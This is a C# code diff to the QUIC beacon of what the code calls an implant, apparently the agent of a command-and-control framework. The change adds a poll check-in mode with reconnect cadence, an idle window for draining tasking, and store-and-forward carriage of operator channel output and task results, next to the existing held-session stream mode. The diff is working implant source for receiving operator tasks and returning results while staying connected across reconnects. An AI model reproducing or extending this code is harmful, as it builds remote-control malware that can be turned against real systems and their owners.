@@ -41,6 +41,10 @@ internal static class QuicCheckIn
         setup.Nonces,
         setup.Cadence,
         setup.Held,
+        // The check-in mode rides in like every other client's: stream holds
+        // the session, poll ends each cycle on the idle window below and
+        // sleeps the cadence between connections.
+        setup.Config.Mode,
         // The QUIC enroll exchange's live connection (architecture.md Sec 8,
         // enrollment over QUIC): the first cycle rides it -- the ordinary
         // handshake follows the enroll on the same stream, one connection
@@ -50,12 +54,13 @@ internal static class QuicCheckIn
 
 /// <summary>
 /// Runs the implant's check-in lifecycle over a QUIC stream: dial the
-/// connection, open the stream, handshake (the first message), then hold the
-/// session -- read tasking and channel input, write results and channel
-/// output -- until the connection drops, the kill date passes, or the server
-/// refuses permanently. A dropped connection is a reconnect, not a
-/// termination: the session survives it server-side, so the next cycle
-/// re-handshakes and continues.
+/// connection, open the stream, handshake (the first message), then run
+/// the baked mode -- stream holds the session open (read tasking and
+/// channel input, write results and channel output) until the connection
+/// drops; poll ends each cycle when the tasking queue drains inside the
+/// idle window, sleeping the cadence between connections. A dropped
+/// connection is a reconnect, not a termination: the session survives it
+/// server-side, so the next cycle re-handshakes and continues.
 /// </summary>
 internal sealed class QuicBeacon : ICheckInClient
 {
@@ -85,6 +90,24 @@ internal sealed class QuicBeacon : ICheckInClient
     // dedup, staged/channel/inline shapes) over this client's per-run state.
     private readonly BeaconTasking _tasking;
 
+    // The check-in mode (stream holds, poll cycles -- the same pair every
+    // client bakes).
+    private readonly string _mode;
+
+    // How long a poll-mode read waits for the next downstream frame before
+    // deciding the queue is drained and ending the cycle -- the same window
+    // the gRPC stream's poll shape applies. The server pushes tasking the
+    // moment it is queued, so the window only needs to outlast that push; a
+    // close that races a dispatch is still safe -- an unclaimed task stays
+    // queued server-side.
+    private static readonly TimeSpan PollIdleWindow = TimeSpan.FromMilliseconds(250);
+
+    private bool IsPoll => _mode == BeaconModes.Poll;
+
+    // The poll run's store-and-forward channel carriage (PollChannels);
+    // null on a stream run, whose channels live on the connection itself.
+    private readonly PollChannels? _poll;
+
     public QuicBeacon(
         EgressEndpoints egress,
         string implantId,
@@ -98,6 +121,7 @@ internal sealed class QuicBeacon : ICheckInClient
         TaskNonceTracker? nonces = null,
         Cadence? cadence = null,
         HeldTaskLedger? held = null,
+        string mode = BeaconModes.Stream,
         QuicWire? firstWire = null)
     {
         _egress = egress;
@@ -116,6 +140,9 @@ internal sealed class QuicBeacon : ICheckInClient
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
+        _mode = mode;
+        if (mode == BeaconModes.Poll)
+            _poll = new PollChannels(_held, log);
         _firstWire = firstWire;
         _tasking = new BeaconTasking(_implantId, _cas, _fronted, _nonces, _held, _handlers, _log);
     }
@@ -137,6 +164,20 @@ internal sealed class QuicBeacon : ICheckInClient
     /// client that carries it.
     /// </summary>
     public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
+    {
+        try
+        {
+            return await RunCyclesAsync(cancellationToken);
+        }
+        finally
+        {
+            // The run is ending: the poll carriage's channels end with it.
+            if (_poll is not null)
+                await _poll.DisposeAsync();
+        }
+    }
+
+    private async Task<CheckInExit> RunCyclesAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -200,10 +241,11 @@ internal sealed class QuicBeacon : ICheckInClient
     }
 
     // One connection: dial (or take the enroll exchange's handoff wire, the
-    // one connection that carries enroll-then-session), handshake, then hold
-    // the session until the server closes, the connection drops, or
-    // cancellation fires. Throws on transport errors (the caller logs and
-    // reconnects); a refused handshake returns Terminal.
+    // one connection that carries enroll-then-session), handshake, then run
+    // the baked mode -- stream holds the session until the server closes,
+    // the connection drops, or cancellation fires; poll drains the queue and
+    // ends the cycle on the idle window. Throws on transport errors (the
+    // caller logs and reconnects); a refused handshake returns Terminal.
     private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
     {
         await using var wire = TakeFirstWire()
@@ -215,6 +257,11 @@ internal sealed class QuicBeacon : ICheckInClient
         // intersected with the compiled handlers (architecture.md Sec 5.3),
         // both negotiation arms offered.
         var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
+        // The poll run's channel carriage rides the advertisement: the
+        // server's parking hub reads it off the session and parks operator
+        // input for the cycles to carry.
+        if (_poll is not null)
+            handshake.Capabilities.Add(PollChannels.Capability);
         await wire.WriteFramesAsync(
             new[] { new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) } },
             CancellationToken.None);
@@ -246,10 +293,32 @@ internal sealed class QuicBeacon : ICheckInClient
         using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
         async Task Write(Frame frame, CancellationToken ct) => await WriteFrameAsync(wire, writeGate, frame, ct);
 
+        // The poll run's store-and-forward batch rides first: every frame the
+        // channels queued while disconnected (output, final results) crosses
+        // on this cycle, delivered only when the writes did. Ahead of the
+        // held replay on purpose -- the batch carries a channel's output
+        // frames ahead of its final TaskResult, and a replayed result
+        // landing first would complete the task before the transcript
+        // frames that belong ahead of it. In poll mode the batch is also the
+        // result channel: the held snapshot rides it, marked only when the
+        // writes crossed (a wire-writing replay would duplicate every batch
+        // result on every cycle).
+        List<Frame>? pollPending = null;
+        IReadOnlyList<HeldTaskLedger.Remembered>? pollSending = null;
+        if (_poll is not null)
+        {
+            pollPending = _poll.SnapshotPending();
+            pollSending = _held.Undelivered();
+            foreach (var frame in pollPending)
+                await Write(frame, cancellationToken);
+        }
+
         // Results whose delivery died with an earlier connection ride this
-        // one first (architecture.md Sec 10.3 -- the dispatch strand); the
-        // server records first-wins, so a duplicate is absorbed.
-        await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);
+        // one next (architecture.md Sec 10.3 -- the dispatch strand); the
+        // server records first-wins, so a duplicate is absorbed. Stream mode
+        // only -- the poll batch above already carries its own.
+        if (_poll is null)
+            await _tasking.ReplayUndeliveredAsync(Write, cancellationToken);
 
         try
         {
@@ -265,7 +334,10 @@ internal sealed class QuicBeacon : ICheckInClient
                     // operator input for a live channel, routed by task id.
                     if (frame.Kind == FrameKind.ChannelInput)
                     {
-                        BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
+                        if (_poll is not null)
+                            _poll.RouteInput(frame);
+                        else
+                            BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                         continue;
                     }
 
@@ -279,18 +351,53 @@ internal sealed class QuicBeacon : ICheckInClient
                         await Write(BeaconFrames.AckFrame(task.TaskId), cancellationToken);
                     await _tasking.AcceptAsync(
                         task,
-                        isPoll: false,
                         Write,
                         (staged, ct) => RunStagedTaskAsync(wire, writeGate, staged, ct),
-                        (started, handler) => StartChannel(wire, writeGate, liveChannels, started, handler, channelsGone.Token),
+                        _poll is not null
+                            ? (started, handler) => _poll.StartChannel(started, handler)
+                            : (started, handler) => StartChannel(wire, writeGate, liveChannels, started, handler, channelsGone.Token),
                         cancellationToken);
                 }
 
-                // A message carrying only the handshake response is a live
-                // keep-alive: park here until the next message -- pushed
-                // tasking, channel input, or the close that ends the session.
-                inbound = await wire.ReadFramesAsync(cancellationToken);
+                if (IsPoll)
+                {
+                    // The poll shape: the queue is drained when no further
+                    // frame arrives inside the idle window, so the cycle ends
+                    // -- the connection closes, the cadence sleeps, the next
+                    // cycle reconnects and re-handshakes (the session survives
+                    // server-side). A channel task never starts here; the
+                    // shared acceptance refuses it on the task with the fix.
+                    using var idle = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+                    idle.CancelAfter(PollIdleWindow);
+                    try
+                    {
+                        inbound = await wire.ReadFramesAsync(idle.Token);
+                    }
+                    catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+                    {
+                        break;
+                    }
+                }
+                else
+                {
+                    // A message carrying only the handshake response is a live
+                    // keep-alive: park here until the next message -- pushed
+                    // tasking, channel input, or the close that ends the session.
+                    inbound = await wire.ReadFramesAsync(cancellationToken);
+                }
                 index = 0;
+            }
+
+            // The batch crossed with the cycle's writes: clear exactly what
+            // was flushed, and mark the held results the batch carried. A
+            // cycle that died mid-write keeps its frames -- and its marks --
+            // for the next one.
+            if (_poll is not null && pollPending is not null)
+            {
+                _poll.MarkDelivered(pollPending);
+                if (pollSending is not null)
+                    foreach (var remembered in pollSending)
+                        _held.MarkDelivered(remembered.TaskId);
             }
         }
         finally
@@ -305,6 +412,11 @@ internal sealed class QuicBeacon : ICheckInClient
                 live.CompleteInput();
             await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
         }
+
+        // The poll shape's normal exit: the idle window closed the read loop
+        // with the queue drained, a cycle like any other -- the caller sleeps
+        // the cadence and reconnects.
+        return BeaconCycleResult.Handshaken;
     }
 
     // Claims the enroll exchange's handoff wire exactly once: the first
